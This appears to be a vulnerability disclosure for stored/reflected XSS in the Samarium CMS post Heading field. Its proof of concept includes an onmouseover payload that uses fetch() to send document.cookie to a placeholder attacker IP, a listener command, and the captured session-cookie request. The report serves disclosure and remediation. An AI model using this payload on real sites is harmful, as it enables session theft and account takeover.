# Reflected Cross-Site Scripting (XSS) — cookie exfiltration / arbitrary JS execution

When visiting http://localhost:8000/cms/post and creating a new post using the Heading field, it is possible to insert unsanitized XSS payloads. For example, by adding an element with an onmouseover attribute we were able to demonstrate both reflected XSS and exfiltration of the user's session cookie.

GitHub: https://github.com/oitcode/samarium

## Environment / access:
- Docker image: samarium-app
- DB: samarium_db (MySQL)
- Test URL: http://localhost:8000
- Version / commit: v0.9.6 (please see attached composer.lock / commit hash if available)
  
## POC (brief):
1. Start a listener on an attacker host:
   python3 -m http.server 4444

2. Create a post (Heading) containing:
   <a onmouseover="fetch('http://<YOUR-IP>:4444/?pwned='+document.cookie)">ON MOUSE OVER</a>
<img width="1717" height="595" alt="Image" src="https://github.com/user-attachments/assets/c1c62305-2c55-4b60-9a28-ba04aedee087" />

3. Visit the post page and hover the injected element — the listener receives:
   GET /?pwned=XSRF-TOKEN=...; samarium_erp_session=... HTTP/1.1
<img width="962" height="299" alt="Image" src="https://github.com/user-attachments/assets/6dbda46d-64cc-4d9e-8db7-90573dabafe5" />

and when you hover the mouse over the text on the screen "On Mouse Over" we receive the session cookie

<img width="962" height="299" alt="Image" src="https://github.com/user-attachments/assets/01596a9a-43b1-4818-a6bf-e9f3f49976dd" />


## Impact

High — an attacker can execute arbitrary JavaScript in the context of any user who views the crafted content or visits a crafted URL.

Possible consequences include theft of session cookies and CSRF tokens, account takeover, performing actions on behalf of the victim, and lateral social‑engineering attacks.

Risk is increased if cookies are not set with HttpOnly, Secure and suitable SameSite attributes.

## Technical details

The Heading field accepts HTML and attributes without adequate sanitization or output encoding.

Inline event attributes such as onmouseover are not filtered or removed, allowing code execution when the event is triggered.

This behavior leads to both stored and reflected XSS scenarios depending on how content is shared or linked.
